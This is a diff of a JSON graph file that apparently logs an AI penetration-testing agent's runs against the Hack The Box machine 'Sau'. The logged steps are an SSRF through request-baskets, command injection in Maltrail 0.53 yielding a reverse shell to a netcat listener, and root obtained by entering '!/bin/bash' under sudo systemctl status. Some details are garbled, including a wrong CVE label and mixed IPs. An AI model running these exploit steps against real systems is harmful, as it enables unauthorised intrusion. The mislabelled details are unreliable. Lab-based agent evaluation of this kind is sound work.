+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r5_base",
+      "label": "Track: Exploit the identified vu\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 5/6] 1.3.1 Perform a port scan: Host: sau.htb (10.129.229.26), Host status: Up (1.0s latency), Closed TCP ports: 997 (conn-refused), Open Ports: 22, 80, 55555\n\n1.3.2 Determine the services and versions on each open port: Port 22: Open, Service: ssh, Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0), Port 80: Filtered, Service: http, Port 55555: Open, Service: unknown, Port 55555 Responses: Invalid basket name error with pattern: ^[wd-_\\.]{1,250}$, HTTP/1.0 400 Bad Request, Content-Type: text/plain; charset=utf-8, HTTP/1.0 302 Found, Location: /web, HTTP/1.0 200 OK, Allow: GET, OPTIONS, Unrecognized service: 1 service unrecognized despite returning data on port 55555, Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n1.3.3 Enumerate further on the services: Port 80: No response, Port 55555: Directs to a web portal, Web Portal Content: Functionality: Creates a basket to collect and inspect HTTP requests, My Baskets: wygbo5a, Powered by request-baskets, Version: 1.2.1, Basket Function: Collects any request sent to it, Example: GET request sent to one of the baskets (dmt5wkr) using curl, Headers: Accept: */*, User-Agent: curl/8.5.0, Time: 2:01:55 pm 04/08/2025, Configuration Setup Box: Allows to set up the config, Configuration Settings: Forward URL: 127.0.0.1:80, Insecure TLS: Only affects forwarding to URLs like https://..., Proxy Response: Expand Forward Path, Basket Capacity: 200, Action: Redirected the GET requests coming to the basket to port 80 and got the proxy response back, bypassing the port filtering, Response Content: altrail Documentation, Wiki, Issues, Log In, Filters: Threats, Events, Severity, Sources, Trails, Powered by Maltrail (v0.53), Options: Hide threat, Report false positive\n\n1.3.4 Vulnerability Assessment: Google search results indicate that the tested version is vulnerable to an OS command execution vulnerability and a public exploit exists. The vulnerability can be exploited by setting up a listener with netcat and running the provided proof of concept (POC). The POC requires modification to use the URL from a previous exploit. The POC is available at: https://github.com/spookier/Maltrail-v0.53-Exploit.\n\n1.3.5 Exploit the selected exploitation: The tester cloned a repository and modified the target_URL in the login line. The exploit was run using python3 on the target http://10.129.229.26:55555/dmt5wkr/login. A reverse shell was obtained and the tester connected using netcat listening on port 4444. The current user of the shell is 'puma' and the present working directory is /opt/maltrail. The directory contains files and folders such as CHANGELOG, core, docker, maltrail-sensor.service, maltrail-server.service, maltrail.conf, plugins, requirements.txt, trails, CITATION.cff, LICENSE, README.md, html, misc, sensor.py, server.py, and others.}\n   1.4 Target IP: 10.129.229.26 - (updated) {Findings: SSH Host Key: RSA: 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed, ECDSA: 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21, ED25519: 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36, Scan Duration: 375.21 seconds, IP Address: 10.129.229.26\n\n1.5 Search for files, commands and their privileges: The user 'puma' on the system 'sau' has sudo privileges without requiring a password to run the command '/usr/bin/systemctl status trail.service'. However, an attempt to check the version of 'systemctl' failed, suggesting the 'systemctl' command may not be correctly installed or accessible in the current environment. The system suggested installing 'systemctl' from either deb systemd (245.4-4ubuntu3.22) or deb systemctl (1.4.3424-2).\n\n1.6 Exploit the sudo privileges: The command 'sudo /usr/bin/systemctl status trail.service' was run by the user 'puma' on the system 'sau'. The output shows that 'trail.service', a Maltrail server for malicious traffic detection, is active and has been running since Mon 2025-08-04 03:36:02 UTC. The main PID of the service is 871 and it's using 40.3M of memory. The service has multiple tasks running under it, including python3 scripts and logger commands. The documentation for the service can be found at https://github.com/stamparm/maltrail#readme and https://github.com/stamparm/maltrail/wiki. The version of 'systemctl' on the system is systemd 245 (245.4-4ubuntu3.22) with a hybrid default hierarchy.\n\n1.7 Vulnerability Analysis: The security testing tool identified several known vulnerabilities in the `systemd` version `245.4-4ubuntu3.22`. These vulnerabilities include: CVE-2020-13529: A Denial-of-Service (DoS) vulnerability exists due to DHCP FORCERENEW spoofing, CVE-2020-13776: A Privilege Escalation vulnerability exists due to numerical usernames, CVE-2022-4415: A Local Information Leak vulnerability exists in `systemd-coredump` due to not respecting the `fs.suid_dumpable` kernel setting, CVE-2023-26604: A Local Privilege Escalation vulnerability exists due to improper blocking of privilege escalation for some `sudo` configurations.\n\n1.8 Exploit the identified vulnerabilities: The security testing tool identified a Local Privilege Escalation vulnerability (CVE-2023-26604) due to improper blocking of privilege escalation for some `sudo` configurations, specifically when the `systemctl status` command may be executed. This vulnerability was exploited by binding it with `systemctl`, which was deemed more appropriate. Root shell was obtained by entering `!/bin/bash` into the hanging shell.",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r5_base",
+      "label": "Agent: Baseline\nReconnaissance",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 5/6] Cumulative PTT so far:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services\n    \u2713 1.3.4 Vulnerability Assessment\n    \u2713 1.3.5 Exploit the selected exploitation\n  \u2713 1.5 Search for files, commands and their privileges\n  \u2713 1.6 Exploit the sudo privileges\n  \u2713 1.7 Vulnerability Analysis\n  \u2713 1.8 Exploit the identified vulnerabilities",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r5_close",
+      "label": "Agent: Task\nComplete (Goal)",
+      "type": "Agent",
+      "color": "#FF006E",
+      "title": "[Run 5/6] Final cumulative PTT for this run:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate further on the services\n    \u2713 1.3.4 Vulnerability Assessment\n    \u2713 1.3.5 Exploit the selected exploitation\n  \u2713 1.5 Search for files, commands and their privileges\n  \u2713 1.6 Exploit the sudo privileges\n  \u2713 1.7 Vulnerability Analysis\n  \u2713 1.8 Exploit the identified vulnerabilities",
+      "size": 46,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r6_base",
+      "label": "Search: Baseline\n(2 item(s))",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 6/6] Baseline recon already completed before this run's first tracked step:\n1.3.1 Perform a port scan\n1.3.2 Determine the services and versions on each open port",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r6_base",
+      "label": "Track: Determine the services an\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 6/6] 1.3.1 Perform a port scan: 1.3.1:{Nmap version:7.80, Scan date and time:2024-01-04 10:26 EST, IP address scanned:10.10.11.224, Host status:Up, Latency:0.11s, Closed ports:65531, Scan duration:7.31 seconds\n\n1.3.2 Determine the services and versions on each open port: 1.3.2:{Open Ports and Services: Port 22/tcp: Open, Service: ssh, Port 55555/tcp: Open, Service: unknown, Filtered Ports and Services: Port 80/tcp: Filtered, Service: http, Port 8338/tcp: Filtered, Service: unknown} \n       1.3:{Target IP:10.129.229.26",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_base",
+      "label": "Agent: Baseline\nIdentify Open Ports, \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 6/6] Cumulative PTT so far:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r6_s1_1.3.3",
+      "label": "Search: 1.3.3\nEnumerate port 80",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 6/6] PTT item 1.3.3: Enumerate port 80\n\nMCP tool calls:\n- Nmap: Enumerate services and versions on ports 80 and 55555.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r6_s1_1.3.3",
+      "label": "Track: 1.3.3:{Port 80: Not loaded",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 6/6] 1.3.3 Enumerate port 80:\n1.3.3:{Port 80: Not loaded",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_s1_1.3.3",
+      "label": "Agent: 1.3.3\nIdentify Open Ports, \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 6/6] Cumulative PTT after 1.3.3:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate port 80\n    \u2713 1.3.4 Enumerate port 55555",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r6_s1_1.3.4",
+      "label": "Search: 1.3.4\nEnumerate port 55555",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 6/6] PTT item 1.3.4: Enumerate port 55555\n\nMCP tool calls:\n- Nmap: Enumerate services and versions on ports 80 and 55555.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r6_s1_1.3.4",
+      "label": "Track: 1.3.4:{Port 55555: Directs to\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 6/6] 1.3.4 Enumerate port 55555:\n1.3.4:{Port 55555: Directs to a web page, Web page function: Collecting and inspecting HTTP requests, Web page URL: http://10.129.229.26:55555/, Action: Creating a basket to collect and inspect HTTP requests, Result of action: Returns a token for future basket access, Basket created: 'wygbo5a', Token received: fAyZqu93BRdiZ2UakGim_JbTk5rhtCrmUojTozkLjoNM",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_s1_1.3.4",
+      "label": "Agent: 1.3.4\nIdentify Open Ports, \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 6/6] Cumulative PTT after 1.3.4:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate port 80\n    \u2713 1.3.4 Enumerate port 55555",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r6_s2_1.3.5",
+      "label": "Search: 1.3.5\nFurther Enumerate the web\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 6/6] PTT item 1.3.5: Further Enumerate the website\n\nMCP tool calls:\n- Dirbuster: Brute force hidden directories and links on the webpage.\n- Web page interaction: Interact with the webpage to inspect functionalities and collect tokens.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r6_s2_1.3.5",
+      "label": "Track: 1.3.5:{Basket functionality: \u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 6/6] 1.3.5 Further Enumerate the website:\n1.3.5:{Basket functionality: Collects HTTP requests, Basket status: Empty, Basket URL: http://10.129.229.26:55555/wygbo5a, GET request made to the basket, GET request time: 8:08:58 pm 02/08/2025, GET request endpoint: /wygbo5a, Headers of GET request: Accept: */*, User-Agent: curl/8.5.0, Powering service: request-baskets, Version: 1.2.1, Directories found with statuses, sizes: /baskets: Status 401, Size 0, /Documents and Settings: Status 400, Size 75, /lost+found: Status 400, Size 75, /Program Files: Status 400, Size 75, /reports list: Status 400, Size 75, /web: Status 200, Size 8700",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_s2_1.3.5",
+      "label": "Agent: 1.3.5\nIdentify Open Ports, \u2026",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 6/6] Cumulative PTT after 1.3.5:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate port 80\n    \u2713 1.3.4 Enumerate port 55555\n    \u2713 1.3.5 Further Enumerate the website",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r6_s3_1.4",
+      "label": "Search: 1.4\nPerform vulnerability ana\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 6/6] PTT item 1.4: Perform vulnerability analysis on 'request-baskets' version 1.2.1\n\nMCP tool calls:\n- Google search: Search for vulnerabilities and exploits related to 'request-baskets' version 1.2.1",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r6_s3_1.4",
+      "label": "Track: 1.4:{Vulnerability identified\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 6/6] 1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1:\n1.4:{Vulnerability identified: CVE-2023-27163, Vulnerability type: Server-Side Request Forgery (SSRF), Vulnerability severity: Critical, Vulnerable component: `/api/baskets/{name}` in Request-Baskets version 1.2.1, Vulnerability description: Allows attackers to make unauthorized requests to internal or external resources. It can lead to access to network resources, sensitive information, and exploitation of other vulnerabilities, Exploitation method: Involves creating a basket within Request-Baskets and manipulating the `forward_url` parameter to point to internal services or resources, Impact: Information Disclosure/Exfiltration: Retrieval of sensitive data from internal network resources, Unauthorized Access: Potential bypass of security measures to access resources, Further Attacks: SSRF vulnerability can be chained with other exploits for more severe outcomes, like Remote Code Execution (RCE), Service Disruption: Potential overload of the server leading to denial-of-service conditions, Mitigation: Update Request-Baskets to a version higher than 1.2.1, implement strong network security practices, and robust authentication mechanisms",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_s3_1.4",
+      "label": "Agent: 1.4\nReconnaissance",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 6/6] Cumulative PTT after 1.4:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate port 80\n    \u2713 1.3.4 Enumerate port 55555\n    \u2713 1.3.5 Further Enumerate the website\n  \u2713 1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r6_s4_1.5",
+      "label": "Search: 1.5\nExploit the found exploit\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 6/6] PTT item 1.5: Exploit the found exploitation\n\nMCP tool calls:\n- Metasploit: Exploit the SSRF vulnerability in 'request-baskets' version 1.2.1 using the identified proof of concept.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r6_s4_1.5",
+      "label": "Track: 1.5:{Command executed: `sudo \u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 6/6] 1.5 Exploit the found exploitation:\n1.5:{Command executed: `sudo ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80`, Purpose: Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163), More info URL: https://github.com/entr0pie/CVE-2023-27163, Action: Created a proxy basket \"qrylhr\", Result: Accessing http://10.129.229.26:55555/qrylhr makes the server request to http://127.0.0.1:80, Authorization token: QpN9Y1vLdotSZOPzt7P00SUDMvZngpKrBhJqlfdRJPOJ, Findings: Port 80 is powered by Maltrail (v0.53), Maltrail interface includes: Documentation, Wiki, Issues, Log In, Threats, Events, Severity, Sources, Trails, Maltrail version: v0.53",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_s4_1.5",
+      "label": "Agent: 1.5\nReconnaissance",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 6/6] Cumulative PTT after 1.5:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate port 80\n    \u2713 1.3.4 Enumerate port 55555\n    \u2713 1.3.5 Further Enumerate the website\n  \u2713 1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1\n  \u2713 1.5 Exploit the found exploitation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r6_s5_1.6",
+      "label": "Search: 1.6\nPerform vulnerability ana\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 6/6] PTT item 1.6: Perform vulnerability analysis on Maltrail (v0.53)\n\nMCP tool calls:\n- Google search: Search for known vulnerabilities and exploits for Maltrail (v0.53)",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r6_s5_1.6",
+      "label": "Track: 1.6:{Maltrail version: 0.53, \u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 6/6] 1.6 Perform vulnerability analysis on Maltrail (v0.53):\n1.6:{Maltrail version: 0.53, Vulnerabilities identified: Unauthenticated Remote Code Execution (RCE) and Command Injection, Specific vulnerabilities: CVE-2023-27163: Allows for unauthenticated RCE. The exploit involves sending a crafted payload to the login endpoint of Maltrail, enabling arbitrary code execution on the target system without credentials. This could lead to gaining a shell on the victim machine, Unauthenticated Command Injection: Present in versions prior to 0.54, including 0.53. The vulnerability exists in the `params.get(\"username\")` parameter within the `mailtrail/core/http.py` file. Attackers can inject arbitrary OS commands through the username parameter, which will be executed with the privileges of the running process. This has been successfully tested on Maltrail versions 0.52 and 0.53, Exploitation: Involves sending a specially crafted request to the Maltrail login endpoint to execute malicious commands or establish a reverse shell, Mitigation recommendation: Update Maltrail to a patched version as soon as possible to mitigate these risks.",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_s5_1.6",
+      "label": "Agent: 1.6\nReconnaissance",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 6/6] Cumulative PTT after 1.6:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate port 80\n    \u2713 1.3.4 Enumerate port 55555\n    \u2713 1.3.5 Further Enumerate the website\n  \u2713 1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1\n  \u2713 1.5 Exploit the found exploitation\n  \u2713 1.6 Perform vulnerability analysis on Maltrail (v0.53)",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r6_s6_1.7",
+      "label": "Search: 1.7\nExploit the selected expl\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 6/6] PTT item 1.7: Exploit the selected exploitation\n\nMCP tool calls:\n- Metasploit: Exploit the Unauthenticated Remote Code Execution and Command Injection vulnerabilities in Maltrail (v0.53).",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r6_s6_1.7",
+      "label": "Track: 1.7:{Action: Modified the Pro\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 6/6] 1.7 Exploit the selected exploitation:\n1.7:{Action: Modified the Proof-of-Concept (POC) for CVE-2023-27163 by removing /login on line 28, Command executed: `./cve-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80/login`, Result: Created a proxy basket \"jgulua\". Accessing http://10.10.11.224:55555/jgulua now makes the server request to http://127.0.0.1:80/login, Authorization token: Je6HFdfIxVWIxmlDzyQWsTnB0uFGpdBAkOb8n3WniMGZ, Action: Ran the modified exploit script using command `python maltrail_rce. 10.10.16.163 443 http://10.129.229.26:55555/jgulua`, Observation: The script hangs, but a shell is received on a listening netcat (nc) at port 443, Shell details: Connection received on 10.10.11.224 46168, uid=1001(puma), gid=1001(puma), groups=1001(puma)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_s6_1.7",
+      "label": "Agent: 1.7\nReconnaissance",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 6/6] Cumulative PTT after 1.7:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate port 80\n    \u2713 1.3.4 Enumerate port 55555\n    \u2713 1.3.5 Further Enumerate the website\n  \u2713 1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1\n  \u2713 1.5 Exploit the found exploitation\n  \u2713 1.6 Perform vulnerability analysis on Maltrail (v0.53)\n  \u2713 1.7 Exploit the selected exploitation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r6_s8_1.7",
+      "label": "Search: 1.7\nExploit the selected expl\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 6/6] PTT item 1.7: Exploit the selected exploitation\n\nMCP tool calls:\n- Metasploit: Run the command '/usr/bin/systemctl status trail.service' to check for vulnerabilities.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r6_s8_1.7",
+      "label": "Track: 1.7:{Action: Modified the Pro\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 6/6] 1.7 Exploit the selected exploitation:\n1.7:{Action: Modified the Proof-of-Concept (POC) for CVE-2023-27163 by removing /login on line 28, Command executed: `./cve-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80/login`, Result: Created a proxy basket \"jgulua\". Accessing http://10.10.11.224:55555/jgulua now makes the server request to http://127.0.0.1:80/login, Authorization token: Je6HFdfIxVWIxmlDzyQWsTnB0uFGpdBAkOb8n3WniMGZ, Action: Ran the modified exploit script using command `python maltrail_rce. 10.10.16.163 443 http://10.129.229.26:55555/jgulua`, Observation: The script hangs, but a shell is received on a listening netcat (nc) at port 443, Shell details: Connection received on 10.10.11.224 46168, uid=1001(puma), gid=1001(puma), groups=1001(puma)",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_s8_1.7",
+      "label": "Agent: 1.7\nReconnaissance",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 6/6] Cumulative PTT after 1.7:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate port 80\n    \u2713 1.3.4 Enumerate port 55555\n    \u2713 1.3.5 Further Enumerate the website\n  \u2713 1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1\n  \u2713 1.5 Exploit the found exploitation\n  \u2713 1.6 Perform vulnerability analysis on Maltrail (v0.53)\n  \u2713 1.7 Exploit the selected exploitation\n  \u2713 1.8 Explore the suspicious files, commands and create a summary of the findings\n  \u2713 1.9 Exploit the selected exploitation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r6_s8_1.8",
+      "label": "Search: 1.8\nExplore the suspicious fi\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 6/6] PTT item 1.8: Explore the suspicious files, commands and create a summary of the findings\n\nMCP tool calls:\n- Metasploit: Run the command '/usr/bin/systemctl status trail.service' to check for vulnerabilities.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "track:sau:r6_s8_1.8",
+      "label": "Track: 1.8:{User examined: puma, Ser\u2026",
+      "type": "Track",
+      "color": "#06D6A0",
+      "title": "[Run 6/6] 1.8 Explore the suspicious files, commands and create a summary of the findings:\n1.8:{User examined: puma, Server: sau, sudo privileges: puma user can run some systemctl commands as root without a password, Specific command puma can run without password: `/usr/bin/systemctl status trail.service`, Matching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin",
+      "size": 34,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "agent:sau:r6_s8_1.8",
+      "label": "Agent: 1.8\nReconnaissance",
+      "type": "Agent",
+      "color": "#3A86FF",
+      "title": "[Run 6/6] Cumulative PTT after 1.8:\n\u2713 1 Reconnaissance\n  \u2713 1.1 Passive Information Gathering\n  \u2713 1.2 Active Information Gathering\n  \u2713 1.3 Identify Open Ports, Services running on the open ports and their versions\n    \u2713 1.3.1 Perform a port scan\n    \u2713 1.3.2 Determine the services and versions on each open port\n    \u2713 1.3.3 Enumerate port 80\n    \u2713 1.3.4 Enumerate port 55555\n    \u2713 1.3.5 Further Enumerate the website\n  \u2713 1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1\n  \u2713 1.5 Exploit the found exploitation\n  \u2713 1.6 Perform vulnerability analysis on Maltrail (v0.53)\n  \u2713 1.7 Exploit the selected exploitation\n  \u2713 1.8 Explore the suspicious files, commands and create a summary of the findings\n  \u2713 1.9 Exploit the selected exploitation",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
+      "borderWidth": 3,
+      "font": {
+        "color": "#212529"
+      }
+    },
+    {
+      "id": "search:sau:r6_s8_1.9",
+      "label": "Search: 1.9\nExploit the selected expl\u2026",
+      "type": "Search",
+      "color": "#FB5607",
+      "title": "[Run 6/6] PTT item 1.9: Exploit the selected exploitation\n\nMCP tool calls:\n- Metasploit: Run the command '/usr/bin/systemctl status trail.service' to check for vulnerabilities.",
+      "size": 40,
+      "shape": "dot",
+      "borderColor": "#212529",
